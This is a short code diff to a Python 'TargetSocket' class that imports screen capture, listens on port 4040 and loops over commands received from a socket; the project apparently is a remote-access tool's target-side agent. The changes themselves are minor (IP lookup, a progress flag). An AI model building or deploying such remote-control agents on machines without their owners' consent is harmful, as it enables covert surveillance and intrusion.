@@ -6,13 +6,11 @@ from PIL import ImageGrab
 from base import *
 from commande_spliter import commande_spliter
 
-ENCODING = 'utf-8'
-
 
 class TargetSocket(BaseSocket):
 
     PORT = 4040
-    IP = socket.gethostname()
+    IP = socket.gethostbyname(socket.gethostname())
 
     def __init__(self, ip: str = IP, port: int = PORT):
         super().__init__()
@@ -31,7 +29,7 @@ class TargetSocket(BaseSocket):
 
     def run(self):
         while True:
-            commande = self.recv_header_data().decode(encoding=ENCODING)
+            commande = self.recv_header_data(show_progress=False).decode(encoding=ENCODING)
             splited_commande = commande_spliter(commande)
 
             if not commande:
